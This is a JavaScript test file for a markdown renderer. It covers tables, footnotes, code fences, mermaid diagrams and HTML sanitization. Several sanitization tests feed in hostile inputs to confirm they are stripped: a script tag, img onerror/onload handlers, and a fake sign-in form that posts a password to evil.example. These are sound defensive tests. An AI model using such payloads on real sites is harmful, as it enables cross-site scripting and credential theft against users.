import test from "node:test"
import assert from "node:assert/strict"
import "./setup-window.js"
import { markdownToHtml } from "../src/render.js"

test("renders GFM tables and strikethrough", () => {
  const html = markdownToHtml("| a | b |\n|---|---|\n| 1 | two |\n\ngone ~~old~~\n")
  assert.match(html, /<table>/)
  assert.match(html, /<td>two<\/td>/)
  assert.match(html, /<s>old<\/s>/)
})

test("renders footnotes", () => {
  const html = markdownToHtml("word[^1]\n\n[^1]: the note\n")
  assert.match(html, /footnote/)
  assert.match(html, /the note/)
})

test("renders read-only task lists", () => {
  const html = markdownToHtml("- [x] done\n- [ ] open\n")
  assert.match(html, /<input[^>]*disabled[^>]*>/)
  assert.match(html, /type="checkbox"/)
})

test("renders subscript and superscript", () => {
  const html = markdownToHtml("H~2~O and x^2^")
  assert.match(html, /<sub>2<\/sub>/)
  assert.match(html, /<sup>2<\/sup>/)
})

test("raw HTML is sanitized, scripts stripped", () => {
  const html = markdownToHtml("<script>alert(1)</script>\n\n<details><summary>s</summary>body</details>\n")
  assert.equal(html.includes("<script>"), false)
  assert.match(html, /<details><summary>s<\/summary>body<\/details>/)
})

test("event-handler attributes are stripped", () => {
  const html = markdownToHtml('<img src="x" onerror="alert(1)" onload="alert(2)">\n')
  assert.equal(html.includes("onerror"), false)
  assert.equal(html.includes("onload"), false)
  assert.match(html, /<img src="x"/)
})

test("linkifies bare URLs", () => {
  const html = markdownToHtml("see https://example.com now\n")
  assert.match(html, /<a href="https:\/\/example.com"/)
})

test("fence info: language, linenums, hl_lines", () => {
  const html = markdownToHtml('```js linenums hl_lines="2 4"\nconst a = 1\nconst b = 2\n```\n')
  assert.match(html, /<pre class="line-numbers" data-line="2,4">/)
  assert.match(html, /<code class="language-js">/)
})

test("fence with only a language tag", () => {
  const html = markdownToHtml("```python\nprint(1)\n```\n")
  assert.match(html, /<pre><code class="language-python">/)
})

test("fence with no info", () => {
  const html = markdownToHtml("```\nplain\n```\n")
  assert.match(html, /<pre><code>plain\n<\/code><\/pre>/)
})

test("mermaid fence renders a diagram placeholder with a source id", () => {
  const html = markdownToHtml("```mermaid\nsequenceDiagram\n    A->>B: hi\n```\n")
  assert.match(html, /<div class="mt-md-diagram" data-mt-diagram="mermaid" data-mt-id="d\d+">/)
  assert.ok(!html.includes("<pre>"))
})

test("mermaid source with --> survives (kept out of the HTML)", () => {
  const html = markdownToHtml("```mermaid\nsequenceDiagram\n    A-->>B: hi\n```\n")
  assert.match(html, /data-mt-id="d\d+"/)
  assert.ok(!html.includes("-->>"), "raw arrows must not appear in the HTML")
})

test("data: images of every bundled type render, even after an unsupported one", async () => {
  const { markdownToHtml } = await import("../src/render.js")
  const md = "![a][1] ![b][2] ![c][3]\n\n[1]: data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=\n\n[2]: data:image/gif;base64,R0lGODdh\n\n[3]: data:image/webp;base64,UklGRg==\n"
  const html = markdownToHtml(md)
  assert.equal((html.match(/<img /g) || []).length, 3)
  assert.match(html, /src="data:image\/svg\+xml;base64,/)
})

test("problems other viewers' users report: HTML first, every task-list form, blank lines in code", () => {
  const html = markdownToHtml('<div align="center">\n<h1>Title</h1>\n</div>\n\nText **bold**\n')
  assert.ok(html.includes('<div align="center">') && html.includes("<h1>Title</h1>") && html.includes("<strong>bold</strong>"))
  const tasks = markdownToHtml("- [ ] a\n* [x] b\n+ [X] c\n1. [ ] d\n   - [x] nested\n")
  assert.equal((tasks.match(/task-list-item-checkbox/g) || []).length, 5)
  assert.equal((tasks.match(/checked/g) || []).length, 3)
  const code = markdownToHtml("```js\nfoo()\n\n\nbar()\n```\n")
  assert.ok(code.includes("foo()") && code.includes("bar()") && code.includes("\n\n\n"))
})

test("raw HTML cannot put a form, a password field or a button on the page; task-list checkboxes stay", () => {
  const html = markdownToHtml('<form action="https://evil.example/c" method="post"><input name="p" type="password"><input name="t"><button>Sign in</button><select><option>a</option></select><textarea></textarea></form>\n\n- [x] done\n')
  assert.ok(!/<(form|button|select|option|textarea)\b/i.test(html), html)
  assert.ok(!/type="password"|name="p"|name="t"/.test(html), html)
  assert.match(html, /type="checkbox"/)
})
